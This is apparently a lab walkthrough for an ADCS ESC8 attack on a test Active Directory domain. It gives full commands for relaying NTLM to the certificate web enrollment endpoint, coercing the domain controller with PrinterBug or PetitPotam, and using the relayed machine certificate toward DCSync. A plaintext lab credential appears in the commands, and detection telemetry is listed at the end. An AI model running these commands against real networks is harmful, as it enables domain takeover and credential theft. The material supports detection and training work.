# WT#056 — ESC8: Web Enrollment Relay

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | Machine (or any) |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | impacket-ntlmrelayx, coercer |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1557, T1649 |
| **Difficulty** | Hard |

## Prerequisites
- CA service running on dc01
- Web Enrollment (CES/AIA) enabled on cadre-CA at `http://dc01.cadre.local/certsrv/`
- Network path to coerce dc01 authentication to attacker machine

## Attack Steps

### 1. Start NTLM relay to ADCS Web Enrollment endpoint
```bash
impacket-ntlmrelayx -t http://dc01.cadre.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

### 2. Coerce dc01 to authenticate to attacker
```bash
# Using PrinterBug (MS-RPRN)
coercer coerce -l 192.168.77.100 -t 192.168.77.10 -u analyst_dfir -p 'An@lyst_DF1R!' -d cadre.local

# Or using PetitPotam (MS-EFSRPC)
python3 petitpotam.py -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' 192.168.77.100 192.168.77.10
```

### 3. Capture relayed certificate
ntlmrelayx receives dc01$ auth → relays to `certfnsh.asp` → obtains dc01$ machine certificate.

### 4. Use dc01$ certificate for DCSync
```powershell
certipy-ad auth -pfx dc01.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

## Post-Exploitation Chain
ESC8 → Coerce dc01 auth → Relay to Web Enrollment → dc01$ machine cert → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **IIS Logs**: HTTP POST to `/certsrv/certfnsh.asp` from attacker IP
- **Event 4887**: Machine certificate enrollment for dc01$
- **Event 5156**: Windows Filtering Platform connection (port 445, 80)
- **Event 4688**: coercer.exe, python.exe, ntlmrelayx process creation
- **Network**: SMB connection from dc01 to attacker, HTTP from attacker to dc01
## Status
CONFIGURED — /CertSrv Web Enrollment active on dc01 (NetworkService, SSL disabled)
